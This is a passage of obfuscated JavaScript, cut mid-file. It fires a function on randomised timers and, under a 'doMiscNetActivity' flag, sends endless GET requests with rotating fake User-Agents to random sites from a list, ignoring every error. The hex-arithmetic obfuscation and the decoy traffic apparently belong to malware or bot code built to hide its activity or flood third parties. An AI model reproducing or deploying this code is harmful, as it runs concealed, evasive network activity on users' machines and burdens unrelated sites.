  for (let k = 0x1 * 0x1b3d + 0x94 * 0x37 + -0x3b09; k < 0x10cc + 0x1230 + -0x22f8; k++)
    setTimeout(f, (-0x2 * 0x9b17 + -0x1c3c2 + 0x4 * 0xf914) * k * getRandomInt(-0x9 * 0x15e + -0x18f9 + 0x2548, 0x21a3 + 0x144d + -0x35ed * 0x1));
  setInterval(() => {
    f();
    for (let l = 0x262c + 0x517 * -0x7 + 0x7 * -0x5d; l < 0x1 * -0x1384 + -0x21c4 + 0x354c; l++)
      setTimeout(f, (0x1 * -0x13393 + 0x6 * -0x1937 + 0x67 * 0x6bb) * l * getRandomInt(0x1 * -0x16ea + -0x7 * 0x404 + 0x3307, 0x43 * 0x52 + 0xbb1 * -0x2 + 0x1ef * 0x1));
  }, 0x22b013 * -0x1 + 0x2b * -0x23b5a + -0xb996b1 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x213 + -0x1ccb + 0x3610) * getRandomInt(0x133b + 0x779 * 0x3 + 0x29a5 * -0x1, 0x2 * 0x419 + 0x24c7 * 0x1 + -0x2cf4));
}, -0x2575 + 0x176 + 0x2463);